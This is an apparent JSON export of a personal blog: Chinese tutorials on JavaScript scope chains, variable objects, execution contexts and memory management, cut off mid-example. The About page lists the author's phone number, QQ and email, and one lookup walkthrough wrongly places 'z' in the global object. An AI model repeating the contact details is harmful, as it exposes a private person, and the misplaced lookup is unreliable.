{"meta":{"title":"LIUXUEWEN'S BLOG","subtitle":null,"description":null,"author":"liuxuewen","url":"http://liuxuewen-site.github.io"},"pages":[{"title":"About me","date":"2018-01-28T16:00:00.000Z","updated":"2018-01-29T12:56:53.315Z","comments":true,"path":"about/index.html","permalink":"http://liuxuewen-site.github.io/about/index.html","excerpt":"","text":"about basic IT程序员，男，就读于广东工业大学计算机学院，网络工程专业本科。 about study 专业课程有：C语言、数据结构、计算机网络、数据库、操作系统…… 自学语言有：HTML(HTML5)、CSS(CSS3)、JavaScript(es6)、UI框架、jQuery、Vue.js、Node.js、JavaWeb…… 对前端情有独钟…… about hobby 喜欢旅游、看电影、运动，尤其是篮球…… about contact QQ:1320325272 TEL:13631438085 E-Mail:1320325272@qq.com GitHub：github.com/liuxuewne"}],"posts":[{"title":"深入理解JavaScript系列04-作用域链","slug":"JS-deep-04","date":"2019-02-01T03:39:50.000Z","updated":"2019-02-01T08:32:44.333Z","comments":true,"path":"2019/02/01/JS-deep-04/","link":"","permalink":"http://liuxuewen-site.github.io/2019/02/01/JS-deep-04/","excerpt":"","text":"一、前言 回顾一下之前的内容，进入执行上下文会创建 VO 对象、建立作用域链、确定 this 指向。执行上下文的数据(函数形参、变量声明、函数声明)是作为属性存储在 VO 中的。 上一节我们讲了 VO。我们知道变量对象在每次进入上下文时创建，并填入初始值，值的更新出现在代码执行阶段。这一节我们继续深入了解执行上下文，来认识作用域链。 二、作用域链 引用 ECMA-262-3 的定义：每一个执行上下文都与一个作用域链相关联。作用域链是一个对象组成的链表，求值标识符的时候会搜索它。当控制进入执行上下文时，就根据代码类型创建一个作用域链，并用初始化对象填充。执行一个上下文的时候，其作用域链只会被 with 声明和 catch 语句所影响。 不能一下子看明白没关系，我们接着往下看，待会回过来思考思考。看个 demo: 1234567891011var a = 10;function foo()&#123; var b = 100; function bar()&#123; return c = a + b; &#125; return bar;&#125;foo()(); 这个例子的执行上下文创建和弹出的过程不明白的见执行上下文一节。根据上边 ECMA-262-3 的定义，作用域链是一个变量对象组成的链表，用来进行变量查询。 比如上面的 bar 上下文的作用域链依次是 AO(bar)、AO(foo)、VO(global)。 我们这样模拟全局上下文： 12345someECStackContext=&#123; AO: ..., this: ..., Scope:[ 所有变量对象的列表 ] // Scope = AO|VO + [[Scope]]，也就是当前变量对象加上所有父级变量对象的列表。&#125; 讲 AO 的时候我们说过了有两个阶段，进入上下文(初始化)、代码执行阶段(update值)。我们还知道 JS 是词法作用域规则，直白的说就是你写代码的时候就确定了作用域。不考虑 eval 环境的话，[[scope]] 与函数紧紧相关。 三、函数的生命周期 函数的生命周期分为两个阶段：创建、调用阶段。 1、函数创建阶段： 123456var a = 20;function foo()&#123; var b = 100; alert( a + b );&#125;foo(); // 120 得到预期的结果，这样来分析：在 foo 的作用域内只有 b 的声明，执行 alert 的时候对 a 进行 RHS 查询，没找到，就去外层作用域查找，ok 找到了。 现在我们用更底层的思路去分析，虽然上边的分析没毛病：首先我们可以确定 foo 的 AO 对象、全局的 VO 对象： 123456789AO(foo) = &#123; b: undefined&#125;VO(global) = &#123; foo: &lt;reference 'foo'&gt;, a: undefined&#125; 那么是怎么找到 a 的呢？联系上边我们说的作用域链： 1）[[scope]] 是所有父级变量对象的层级链，处于当前函数上下文之上，在函数创建时存于其中。当然对 a 的查找是顺着层级往上的。 2）[[scope]] 在函数创建时被存储，静态（不变的），永远永远，直到函数被销毁。也就是说函数一旦创建，[[scope]] 属性已经写入，并存储在函数对象中，无论函数是否调用。 3）[[scope]] 和作用域链不是一个概念，[[scope]] 是函数的一个属性而已： 123foo.[[Scope]] = [ VO(global) ]; 2、函数调用阶段： 前边提到了：Scope = AO|VO + [[Scope]]，更容易理解的形式是这样：Scope = [AO|VO].concat([[Scope]])；在函数调用(进入上下文)阶段，会把当前的 VO|AO 加入到当前执行函数 [[scope]] 属性的前边。 这时我们再回到文章开头提到的 ECMA262-3 对于作用域链的定义。定义中提到了标识符，是干什么呢？标识符的作用就是确定一个变量（或函数声明）属于哪个变量对象。标识符解析算法在 ECMA262-3 中也有定义： 执行过程中，使用下面的算法进行标识符解析查找: 1）获取作用域链中的下一个对象。如果没有，转到步骤5。 2）调用 Result(1) 的 [[HasProperty]] 方法，把标识符作为属性名传递。 3）如果 Result(2) 为 true，返回一个引用类型的值，其基对象是 Result(1)，属性名为标识符。 4）转到步骤1。 5）返回引用类型的值，基对象为 null，属性名为标识符。 6）求值标识符的结果总是一个引用类型的值，其成员名字组件与标识符字符串相等。 大体上说明标识符解析总是会返回一个引用类型，这个引用类型的 getBase() 结果是对应的变量对象(或若未找到则为null)。属性名是向上查找的标识符的名称。在向上查找中，一个上下文中的局部变量较之于父作用域的变量拥有较高的优先级。可以理解为由内向外查找，如果找到了就会返回引用类型，外层有重名的也不会找到那儿去。 引用类型在 this 的章节会详细说明。我们通过一个复杂 demo 来熟悉熟悉： 1234567891011121314var x = 10;function foo() &#123; var y = 20; function bar() &#123; var z = 30; alert(x + y + z); &#125; bar();&#125;foo(); // 60 在上面代码的执行阶段： 1）首先全局上下文： 1234567GlobalECStackContext=&#123; VO(global) = &#123; foo: &lt;reference 'foo'&gt;, x: 10 &#125;, Scope: [ VO(global) ] // 全局上下文的作用域链仅包含全局对象&#125; 2）对于 foo： 12345678910111213141516171819// AO 对象fooECStackContext=&#123; AO:&#123; bar: &lt;reference 'bar'&gt;, y: 20 &#125;&#125;// [[scope]] 属性foo.[[ scope ]] = [ GlobalECStackContext.VO(global) ]// 作用域链fooECStackContext = &#123; AO:&#123; bar: &lt;reference 'bar'&gt;, y: 20 &#125;, Scope: [ fooECStackContext.AO, GlobalECStackContext.VO(global) ]&#125; 3）对于 bar： 123456789101112131415161718192021// AO 对象barECStackContext = &#123; AO:&#123; z: 30 &#125;&#125;// [[scope]] 属性bar.[[ scope ]] = [ fooECStackContext.AO, VO(global) ]// 作用域链barECStackContext = &#123; AO:&#123; z: 30 &#125;, Scope:[ barECStackContext.AO, fooECStackContext.AO, GlobalECStackContext.VO(global) ]&#125; 对 ‘x’, ‘y’, ‘z’ 标识符的解析过程： 1）对 ‘x’ 进行查找： 123barECStackContext.AO // 没找到fooECStackContext.AO // 没找到VO(global) // Get it! 10 2）对 ‘y’ 进行查找： 12barECStackContext.AO // 没找到fooECStackContext.AO // Get it! 20 3）对 ‘z’ 进行查找： 1VO(global) // Get it! 30 就是这样，虽然没有完全的解释清楚 ECMA262-3 中对于标识符解析的算法规则，但是这样容易理解，也就是这样找的。 三、闭包 闭包前面有一篇文章讲述。这里只说说其与 [[scope]] 属性的联系。 在 你不知道的JavaScript 中，闭包定义是：函数拥有对其词法作用域的访问，哪怕是在当前作用域之外执行。在 红宝书 中，闭包定义是：闭包是指有权访问另一个函数作用域中的变量的函数。 通过一个 demo 来解读: 12345678910var x = 20;function foo()&#123; alert(x)&#125;(function()&#123; var x = 10; foo(); // 10&#125;)() 从本章节的内容来看，闭包与 [[scope]] 属性息息相关。 首先之前提到了函数的 [[scope]] 属性是静态属性，函数创建的时候就被存储到函数对象中，函数销毁才会销毁。闭包的特点恰好就是持久的保有对其定义的词法作用域的访问权限。 再来一点，[[scope]] 中保存的是当前函数的所有上层变量对象。上面的 demo 中 foo() 持久访问的正是其上层匿名立即执行函数的 AO 对象中的属性。所以，闭包是函数代码和其 [[scope]] 的结合？ 四、Function 构建的函数 Function 构建的函数，其 [[scope]] 中只有全局的 VO。 这个 Function 是很有意思的，之前在一些讲解原型的高热度文章中，发现很多会说所有的函数都有 prototype 属性。其实是错误的，比如 Function.prototype.bind 创建的函数就没有 prototype 属性的。 同样 Function 构建的函数，其 [[scope]] 也比较特殊，里面只有全局的 VO 对象： 1234567891011121314151617181920212223242526// 证明var a = 10;function foo()&#123; var b = 20; // 函数声明 function f1()&#123; console.log(a, b); &#125; // 函数表达式 var f2 = function()&#123; console.log(a, b); &#125; // Function var f3 = Function('console.log(a,b)') f1(); // 10, 20 f2(); // 10, 20 f3(); // 10, b is not defined&#125;foo(); f3 只能够访问全局 VO 中的属性，不能访问 VO(foo)，印证了 [[scope]] 里面只有全局的 VO 对象。 五、with &amp; catch &amp; eval eval 不建议使用，就简单提一提。代码 eval 的上下文与当前的调用上下文（calling context）拥有同样的作用域链： 1evalContext.Scope === callingContext.Scope 文章开始部分引用的 ECMA-262-3 关于作用域的定义中提到了 with &amp; catch 这一点。事实上在代码执行阶段，可以通过 with 声明和 catch 语句修改作用域链。它们将会被添加到作用域链的最前端： 1234Scope = [ withObj|catchObj, AO|VO, [[scope]] ]// 这样好理解Scope = [ withObj|catchObj ].concat( [ AO|VO ].concat( [[ scope ]] ) ) 很多资料对这个过程解释的很绕，我们通过一段代码具体分析： 12345678910var a = 15, b = 15;with( &#123; a: 10 &#125; )&#123; var a = 30, b = 30; alert(a); // 30 alert(b); // 30&#125;alert(a); // 15 &lt;-- 关键点在这里alert(b); // 30 一步一步分析: 1）代码开始执行： 12345678// 此时的上下文EC = &#123; VO(global):&#123; a: 15, b: 15 &#125;, Scope: [ VO(global) ]&#125; 2）执行 with 语句： 12345678// 此时的上下文EC = &#123; VO(global):&#123; a: 30, // 这里先是10，然后又改写为30 b: 30 &#125;, Scope: [ &#123; a:10 &#125;, VO(global) ] // 添加到作用域链的最前端&#125; 3）with 结束： 12345678// 此时的上下文EC = &#123; VO(global):&#123; a: 15, // --&gt; a: 30 也会被移除，回到最初的状态。即第1步 b: 30 &#125;, Scope: [ VO(global) ] // 从前头移除&#123;a:10&#125;&#125; catch 的过程是一样的。两个核心: 第一是 withObject|catchObject 会被添加到作用域链前端，其实就是标识符解析从 withObj|catchObj 先开始，因为它在头上嘛。这也是我们说 with、catch 可以挟持作用域的原因。 第二就是声明完成之后会移除这些状态，回到最初的美好。 留一个思考题: 1234567891011121314var x = 1, y = 1;function foo( data )&#123; var x = 2, y = 2; function bar()&#123; with( data )&#123; console.log(x); console.log(y); &#125; &#125; bar();&#125;foo( &#123;x: 5&#125; );console.log(x);console.log(y); 六、作用域链与原型链 二维作用域链查找，就是说在对象中没找到就去原型链上查找： 123456function f()&#123; alert( a );&#125;Object.prototype.a = 'jack ma';f(); // jack ma 这个其实大家很熟悉，原型链末尾都是 -&gt; Object.prototype -&gt; null。顺着原型链逐级的委托，最终会成功输出 ‘jack ma’。 好的，接着: 12345678910function outer()&#123; var x = 10; function inner()&#123; alert(x); &#125; inner();&#125;Object.prototype.x = 50;outer() // 10 这里输出了10，而不是顶层原型定义的50。上一个例子输出的明明是原型委托继承的值啊？我们分析： 123456789101112131415161718192021222324// 全局上下文EC(global) = &#123; VO:&#123; outer: &lt;reference 'outer'&gt;, x: 50 // 这里不清楚的请注意前边的文章提到过 window instanceof Object &#125;&#125;// outer上下文EC(outer) = &#123; AO:&#123; inner: &lt;reference 'inner'&gt;, x: 10 &#125;, Scope: [AO, EC(global).VO]&#125;// inner上下文EC(inner) = &#123; AO:&#123; &#125;, Scope: [AO, EC(outer).AO, EC(global).VO]&#125; 在这个流程中，执行阶段会顺着原型链的层级进行标识符解析工作。而活动对象(AO)是没有原型的，所以 inner 的 AO 中没有 x 属性，就去下一链级的 outer 中找，找到了就停，如果没有就去全局找了。全局中的 x 是可以通过原型委托继承得到，所以假如你删除 var x = 10，得到的是原型委托继承的 50。 参考： ECMA-262-3 dmitrysoshnikov.com 标注： 参考资料1：https://github.com/cbbfcd/all-of-javascript/blob/master/深入理解JavaScript系列/scope.md","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"深入理解JavaScript系列03-变量对象","slug":"JS-deep-03","date":"2019-01-28T07:50:59.000Z","updated":"2019-01-28T10:22:27.290Z","comments":true,"path":"2019/01/28/JS-deep-03/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/28/JS-deep-03/","excerpt":"","text":"一、前言 每次函数或者构造器的调用都会进入到一个新的上下文，即使函数是在递归的调用自己。结束后会从上下文堆栈中弹出该上下文，结束可以是每次顺利的返回，也可能是因为未被 catch 的异常抛出等原因。 所以，我们将进入执行上下文(下面都简称 EC) 内部一探究竟，本节关注的焦点是一个抽象的概念 – 变量对象(Variable Object 简称VO)，我们在写代码的时候会声明变量或者函数，那么解释器(interpreter) 是如何、在哪儿找到它们的呢？ 二、执行上下文生命周期 上一节执行上下文中我们提到，函数或者构造器调用的时候会创建新的执行上下文并压入上下文堆栈中，其生命周期大致如下： 从图中看到三大要素：VO、作用域链(Scope Chain)、this，接下来我们一个一个来，本文针对 VO。 三、VO（变量对象） 有很多说法说明什么是 VO，比如: 1）变量与执行上下文相关，它应该知道自己在哪儿以及怎么找到自己，这得益于一种叫做变量对象的机制。 2）所有的执行上下文都有一个与之关联的可变对象，这个对象把声明的函数、变量、参数列表作为其属性，这个可变对象就是 VO。 …… 万变不离其宗，反正都表示 VO 与执行上下文关联，然后目的是为了存取我们代码中声明的变量、函数、函数的形参。所以，进入执行上下文时，生成 VO，然后按照下面的顺序把属性绑定到 VO: 1）函数的形参 2）函数声明 3）变量声明 四、AO（活动对象） Active Object，活动对象，简称AO，ECMA-262@3 中的解释大概是: 当控制进入函数代码的执行上下文时，创建一个活动对象并将它与该执行上下文相关联，并使用一个名为 arguments、特征为 { DontDelete } 的属性初始化该对象。该属性的初始值是稍后将要描述的一个参数对象 Arguments Object(简称ArgO)。活动对象纯粹是一种规范性机制，在 ECMAScript 访问它是不可能的。只能访问其成员而非该活动对象本身。对一个基于对象为活动对象的引用值应用调用运算符时，这次调用的 this 值为 null。 我们总结一下：VO(functionContext) === AO 1）VO 是不能访问的(除了全局上下文的 VO 可以间接访问)，但是可以访问 AO 的成员(属性)。 2）VO 和 AO 其实是一个东西，只是处于不同的执行上下文生命周期。AO 存在于执行上下文位于执行上下文堆栈顶部(就是上边说的 当控制进入函数代码的执行上下文时 )的时期，再粗暴点，就是函数调用时，VO 被激活成了 AO。 3）AO 通过函数的 arguments 属性初始化，其值是一个 ArgO，包括 callee、length、arg 属性，其中 arg 属性就相当于下标，比如第一个参数对应 arg = 0。 五、小试牛刀 为了方便说明，我们模拟 VO/AO 是一个对象: 1VO = &#123;&#125; 执行上下文就是这样: 12345ECStack = &#123; VO: &#123;&#125;, Scope Chain: [], this&#125; 我们得举个例子了: 1234567var a = 20;function foo(x)&#123; var b = 40;&#125;foo(10); 上面这段代码有两个执行上下文，一个全局上下文(Global EC),一个 foo 函数执行上下文(foo EC)。我们分别分析其 VO/AO: 1234567891011121314151617181920GlobalEC=&#123; VO:&#123; foo: &lt;reference to FunctionDeclaration 'foo'&gt;, a: undefined &#125; ...&#125;fooEC=&#123; AO:&#123; arguments:&#123; callee:'指向函数的引用(已经废弃)', length: 1, // 参数长度 arg-&gt; 0: 10 // 改变这个属性也会改变对应活动对象的属性，反之亦然 &#125;, b: undefined, this: window &#125; ...&#125; 1）上边的 undefined 是系统默认的初始值。 2）AO/VO 在代码解释期间是可以被修改的，比如 b 初始值是系统默认的 undefined，解释期间被修改为 b:40。 3）解释一下 ‘改变这个属性也会改变对应活动对象的属性，反之亦然’ ： 12345678910function foo(x, y, z) &#123; alert(arguments.length); // 2 alert(arguments.callee === foo); // true alert(arguments[0]); // 1 arguments[0] = 10; // 改变 arg-&gt;0 对应的值，x 对应的值也改变了。 alert(x); // 10&#125;foo(1,2) // 反之亦然就是这里改变 1，比如传入 50. 改变 arg-&gt;0 对应的值，x 对应的指也改变了: 123456789101112131415161718fooECStack=&#123; VO:&#123; arguments:&#123; // 简写为 x: 1 &#125; &#125;&#125;// 解释期间改变 arg，改写 VOfooECStack=&#123; VO:&#123; arguments:&#123; // 简写为 x: 10 &#125; &#125;&#125; 六、全局上下文的 VO 上边提到全局上下文的 VO 是可以被间接访问的。为啥呢？因为全局上下文中的变量对象就是全局对象自身。全局上下文： 12345GlobalEC = &#123; VO: global object, // 全局对象 Scope Chain:'全局上下文的作用域链只包含全局代码', this: global object // 全局对象&#125; 这里复制一个全局对象(Global object) 的定义：全局对象是在进入任何执行上下文之前就已经创建的对象，这个对象只存在一份，它的属性在程序中任何地方都可以访问，全局对象的生命周期终止于程序退出那一刻。 根据上边的代码，我们知道全局上下文中 this 指向全局对象。所以: 123456789101112console.log(this);// 输出一大串// 大致是:Window:&#123; MathJax:&#123;...&#125;, alert: func, applicationCache:&#123;&#125;, ... window: Window&#123; MathJax:... &#125;, // 指向自身的属性 ...&#125; 说明全局对象初始化的时候加入了一大堆属性，比如 Math、String、blur、screen…全局对象是不能直接通过名字访问的，所以全局对象中添加了指向自身的属性，比如 DOM 中的 window: 123456789var a = 2;console.log(this.a); // 2console.log(a); // 2console.log(window.a); // 2console.log(this.window.a); // 2console.log(this === window); // trueconsole.log(this instanceof Object); // true 七、VO 的生命周期 说是生命周期有点优雅了，其实就是不同阶段的 VO。 1、进入上下文阶段： VO 会依次添加以下： 1）函数的所有形式参数 2）所有函数声明，这个属性由一个函数对象的名称和值组成，如果已经存在相同名称的属性，则会替换 3）所有变量声明，这个属性由变量名称和 undefined 值(系统默认初始值)组成，如果变量名称跟已经声明的形式参数或函数相同，则变量声明被忽略。 接下来看代码： 123456789function foo(x)&#123; var a = 10; var b = function()&#123;&#125; function b()&#123;&#125; (function x()&#123;&#125;) e = 50&#125;foo(10); 这个阶段其 VO/AO 对象是: 12345678910111213fooECStack = &#123; AO:&#123; arguments: &#123; callee:'指向函数的引用', length: 1, arg-&gt;0 : 10 &#125;, b: &lt;reference to FunctionDeclaration 'b'&gt;, a: undefined, this: window &#125; ...&#125; 发觉没有，有三个意外的没有在 AO 中。 1）该阶段，首先 function b(){} 是函数声明，var b = function(){} 是函数表达式(被看作为变量声明)，因为函数声明优先级更高，此时再添加 b 函数表达式的时候发觉 b 重名了，根据上边的第三点，被忽略，所以不在 AO 中。 单独抄袭一个 demo，想一想： 1234567891011121314151617181920212223242526272829function test() &#123; console.log(foo); console.log(bar); var foo = 'Hello'; // 进入上下文阶段会被忽略 console.log(foo); var bar = function () &#123; return 'world'; &#125; function foo() &#123; return 'hello'; &#125;&#125;test();// 进入上下文阶段VO = &#123; foo: &lt;reference 'foo'&gt;, bar: undefined&#125;// 执行代码阶段 AO 被改写AO = &#123; arguments: &#123;...&#125;, foo: 'Hello', bar: &lt;reference 'bar'&gt;, this: Window&#125; 2）该阶段 AO 没有添加 (function x(){})，因为其是一个函数表达式，并且没有存到一个变量中，无法应用变量声明规则，所以也被忽略了。 3）该阶段的 AO 也没有 e，因为它是不是一个变量呢? 如果不是，那肯定没法用变量声明规则，从而没办法加入 AO 中。大神冴羽的博客中(见参考)是将其加入了 AO 中的。然而我翻看一些资料，证明它不是一个变量。 1234567891011121314151617// 首先大家知道为啥不报错吧，非严格模式下，对 e 进行 LHS 查询，找不到就去外层全局找，也没有，就为其建一个声明。// 你可以 console.log(window.e);// 这仅是给全局对象创建了一个新属性(但是它不是变量)。// demoalert(a); // undefinedalert(b); // 'b' is not definedvar a = 10;b = 20;// 我们分析这个 demo 的 VO// 进入上下文阶段VO:&#123; a: undefined&#125;// 在进入上下文阶段没有 b，所以 alert(b) 报错。 执行代码阶段是有输出的: 1234567891011alert(a); // undefinedvar a = 10;b = 20;alert(b); // 20alert(a); // 10// 代码执行阶段VO:&#123; a: 10, b: 20&#125; 还有一个很重要的区别，var 声明的变量是不能通过 delete 删除的： 123456789a = 10;alert(window.a); // 10alert(delete a); // truealert(window.a); // undefinedvar b = 20;alert(window.b); // 20alert(delete b); // falsealert(window.b); // still 20 你在浏览器执行可能不是这个结果，没关系，在 eval 环境也不是这个结果，都可以删除。所以可能是你的浏览器是使用 eval 来执行控制台里你的代码，没关系，我们这样来看: 1234567891011121314var a = 10; Object.getOwnPropertyDescriptor(window,'a');// &#123;value: 10, writable: true, enumerable: true, configurable: false&#125;// 注意： configurable: falseb = 20;Object.getOwnPropertyDescriptor(window,'b');// &#123;value: 20, writable: true, enumerable: true, configurable: true&#125;// 注意：configurable: true// 所以也说明了 var 声明的变量是不可以 delete 的，除非在 eval 环境下。// 这也是变量和普通属性的区别，而普通属性在进入执行上下文阶段是不会添加到 AO 的。 有关对象属性概念不熟悉可参考: 对象全面解析 2、执行代码： 其实前边已经说出了代码执行阶段的 AO 情况，就是解释过程中改写 AO: 12345678alert(x); // functionvar x = 10; // 进入上下文阶段会被忽略 alert(x); // 10 x = 20; function x() &#123;&#125;; alert(x); // 20 其 AO: 1234567891011121314// 进入上下文阶段AO:&#123; x: &lt;reference 'x'&gt;&#125;// 代码执行阶段AO:&#123; x: 10&#125;// 然后AO:&#123; x: 20&#125; 参考： ECMA-262 冴羽’s blog 标注： 参考资料1：https://github.com/cbbfcd/all-of-javascript/blob/master/深入理解JavaScript系列/vo.md","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"深入理解JavaScript系列02-执行上下文","slug":"JS-deep-02","date":"2019-01-25T12:25:37.000Z","updated":"2019-01-28T07:48:49.431Z","comments":true,"path":"2019/01/25/JS-deep-02/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/25/JS-deep-02/","excerpt":"","text":"一、前言 当你熟悉了上一篇提到的内存空间之后，我们接着梳理我们的 JS 轴线。我们大致了解了代码是怎么样分配空间存储的，现在该探究一下是怎么运行的了。 二、执行上下文 &amp; 可执行代码 执行上下文(简称-EC) 是一个抽象概念，ECMA-262标准用这个概念同 可执行代码(executable code) 概念进行区分。可执行代码与执行上下文是相对的，某些时刻二者等价。 当控制器转到一段可执行代码的时候就会进入到一个执行上下文。执行上下文是一个堆栈结构(先进后出)，栈底部永远是全局上下文，栈顶是当前活动的上下文，其余都是在等待的状态，这也印证了 JS 中函数执行的原子性。 所以，用一句话说就是：函数在调用的时候就为其创建一个执行上下文，并将这个执行上下文压入到上下文堆栈中，执行完了弹出去，或者是遇到了提前终止可执行代码进行的，比如 return。全局上下文在浏览器窗口关闭后出栈。 我们来看看可执行代码，一共有 3 种 ECMA 脚本可执行代码: 1）全局代码 2）函数代码 3）eval代码 我们使用数组来模拟一个上下文堆栈： 1ECStack = [] 1、全局代码： 例如外部引入的 js 代码或者 script 标签内的本地代码，其上下文堆栈： 123ECStack = [ globalContext] 2、函数代码： 进入函数的时候就会产生一个执行上下文，为其后续的操作做筹备，这个执行上下文被压入了 ECStack。倘若函数内部还有 inner 函数，进入这个 inner 函数的时候会创建它自己的执行上下文，也就是说函数代码不包括其 inner 的函数代码。 举个例子分析一下: 123456789101112131415161718192021// 1var scope = \"global scope\";function checkscope()&#123; var scope = \"local scope\"; function f()&#123; return scope; &#125; return f();&#125;checkscope();// 2var scope = \"global scope\";function checkscope()&#123; var scope = \"local scope\"; function f()&#123; return scope; &#125; return f;&#125;checkscope()(); 首先这个题是抄袭的 冴羽 的。两个都是输出 local scope，结果是一样的，但是其上下文堆栈中却发生着不同的故事。如果你觉得输出的不是这个结果，建议看看冴羽的文章中关于词法作用域和动态作用域的区别。 对于 1 中发生的故事: 对于 2 中的故事: 再看个例子分析一下: 123456(function foo(bar)&#123; if(bar)&#123; return; &#125; foo(true);&#125;)() 上面的函数使用了递归。即使是这样调用自己的时候也会创建一个执行上下文。便于理解，可以说是每次进入函数都会创建一个新的执行上下文。 看看其中发生的故事： 当相关段代码执行完以后，直到整个应用程序结束，ECStack 都只包括全局上下文(global context)。 3、eval代码： eval 是万恶的，集劫持作用域等罪名集于一身，不过我们还是简单了解一下。eval 有一个概念叫做调用上下文(calling stack)，这是一个当 eval 函数被调用产生的上下文。 看个例子： 12345678eval('var x = 10');(function foo()&#123; eval('var y = 20');&#125;)()alert(x); // 10alert(y); // \"y\" is not defined 用图来说明问题 (evalContext-x，evalContext-y 分别表示其上下文)： 我们以前一般是这样理解的，eval 劫持了 foo 内的作用域，全局环境中没有 y 声明了。现在开始结合调用上下文理解吧! 参考： ECMA-262 # 10 冴羽 blog 标注： 参考资料1：https://github.com/cbbfcd/all-of-javascript/blob/master/深入理解JavaScript系列/executionContext.md","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"深入理解JavaScript系列01-内存空间","slug":"JS-deep-01","date":"2019-01-25T06:45:31.000Z","updated":"2019-01-25T11:40:42.866Z","comments":true,"path":"2019/01/25/JS-deep-01/","link":"","permalink":"http://liuxuewen-site.github.io/2019/01/25/JS-deep-01/","excerpt":"","text":"一、前言 一直以来对 JS 这门动态弱类型语言的理解和认识总是零散杂乱。近期希望整理出一条主轴线来，把 JS 的各方面串联起来。 进入正题，可能以前我们并不关心内存空间，从而导致对内存泄露、深浅拷贝等知识点的理解有点模糊。所以 JS 主轴线就是从内存分配开始。 二、数据结构与算法 所有的语言归根还是为了数据，在内存空间中，编程语言们都有着相似的生命周期： 1）内存分配 2）内存使用：读、写 3）内存释放：垃圾回收 JS 作为一门高级中的 VIP 语言，在创建变量的时候会为其分配内存空间，分配内存的举动是在值的初始化、函数调用等阶段完成。在程序中，使用值的过程其实就是对值的内存空间进行写入和读取。最后，不再使用的内存空间会被自动的进行垃圾回收，但是确定一个分配的内存空间是不是不再使用确实让人头疼，而且自动一词让很多人不再关注于垃圾回收，这恰恰是一个美丽的错误！ 看下面，JS 梳理路线第一波： 所以我们需要了解但是不限于以下知识点： 1）内存是什么? 2）堆(heap) 3）栈(stack) 4）队列(queue) 5）基本类型与引用传递 6）深浅拷贝 7）垃圾回收 8）内存泄露 9）chrome工具进行内存分析 三、内存是什么 硬件上计算机存储器由大量的触发器组成，触发器包含了一些晶体管，每个触发器可以存储 1bit(也叫做位)，触发器有唯一标识用来寻址，因此我们得以读取或者覆盖它们。 触发器的组合形成更大的单位，比如 8bit 为1个字节(byte)，还有 kb… 我们可以抽象理解计算机的整个内存是一个巨大的数组。 静态内存分配和动态内存分配： 对于原始数据类型: 123int a; // 4个字节int b[4]; // 4 * 4个字节double c; // 8 个字节 编译器会检查数据类型并且提前计算出所需的空间大小(4+4*4+8)。然后为这些原始数据变量分配空间，分配的空间我们称为栈空间。假如这些变量定义在一个函数中，当函数被调用的时候，它们的内存就加入到现有的内存中，函数调用终止，它们就会被移除。 编译器能够准确知道上面每一个原始数据变量的地址，并且在插入与操作系统交互的代码的同时在栈上为它们申请对应字节数的空间，这个过程就是静态内存分配，也有称之为自动分配。 又如: 1int n = someFuncReturnN(...) 编译器并不能提前计算出变量所需的空间大小，而是在运行的时候才能确定的，这个时候不能在栈上为其分配空间了，所以这个内存是分配在堆空间上的。这个过程就是动态内存分配。 堆内存涉及指针操作。 静态内存分配和动态内存的区别： 静态内存分配: 1）编译期知道所需内存空间大小 2）编译期执行 3）申请到栈空间 4）LIFO(后进先出) 动态内存分配: 1）编译期不知道所需内存空间大小 2）运行期执行 3）申请到堆空间 4）没有特定的顺序 总结一句话：stack 是采用静态内存分配的内存空间，由系统自行释放。heap 是采用动态内存分配的内存空间，无序，大小不定，不会自动释放，哪怕你退出程序，那一块内存还是在那儿。 四、堆(‘heap’) 根据前边说的动态分配和静态分配我们可以知道： 在 JavaScript 中，引用类型数据(对象、数组、函数)，这么说不太准确，数组和函数也是对象。它们都是申请到堆空间的，然后有一个引用，可以理解为一个指针，它保存了这个对象在堆中的位置。这个引用是存到栈中的。 五、栈(‘stack’) 也叫堆栈。基本数据类型 String，Boolean 之类的变量是申请到栈空间的。 六、队列(‘queue’) 之前看过一个段子：栈和队列的区别? – 吃多了拉就是队列，吃多了吐就是栈。 这也太有才了，不过说明了栈和队列的特点: 栈先入后出、队列先入先出。 七、基本类型与引用传递 搞清楚内存空间，再遇到这种面试题就不会瑟瑟发抖了： 123456789var a = 30;var b = a;b = 30;// a 是多少?var obj = &#123;a: 20, b:30&#125;var newObj = obj;newObj.a = 25;// obj.a 是多少? 前者 a、b 都在栈空间申请了内存，var b=a 的时候分配了新的值，两者互不相干。 后者的是引用传递，两者指向堆内存空间的某个位置的同一个对象，所以对对象的操作是互相影响的。 八、深浅拷贝 浅拷贝：可以理解为只拷贝了1层，如果有数组之类的对象的话，实际是拷贝了其引用，所以操作该对象是互相影响的。内存上是两个引用指向了堆空间中的同一对象： 123456789var o = &#123; name: 'jack ma', friends: ['李彦宏', '马化腾']&#125;var c = Object.assign(&#123;&#125;, o);c.friends.push('雷军');o.friends; // [\"李彦宏\", \"马化腾\", \"雷军\"] 深拷贝: 就是递归的拷贝，把属性值也拷贝了，互不影响了。内存上是两个引用分别指向了堆空间中的不同对象，但是初始值是一样的： 123456789var o = &#123; name: 'jack ma', friends: ['李彦宏', '马化腾']&#125;var c = JSON.parse(JSON.stringify(o))c.friends.push('雷军');o.friends; // [\"李彦宏\", \"马化腾\"] 九、垃圾回收 垃圾回收是 JS 自动完成的，但是不代表我们就不去关注它。实际上确定一个内存不再被使用，然后将其释放是很难的。通常有以下几种算法实现，但是也有很大的局限性。 1、引用计数垃圾收集算法： 这个算法是最简单的，假如一个对象没有指针指向它，那它就被认为是可回收的。 下面是MDN上面的例子： 12345678910111213141516var o = &#123; // 两个对象被创建，一个作为另一个的属性被引用，另一个被分配给变量 o，很显然，没有一个可以被垃圾收集 a: &#123; b:2 &#125;&#125;; var o2 = o; // o2 变量是第二个对 '这个对象' 的引用o = 1; // 现在，'这个对象' 的原始引用 o 被 o2 替换了var oa = o2.a; // 引用 '这个对象' 的 a 属性，现在，'这个对象' 有两个引用了，一个是 o2，一个是 oao2 = \"yo\"; // 最初的对象现在已经是零引用了，他可以被垃圾回收了 // 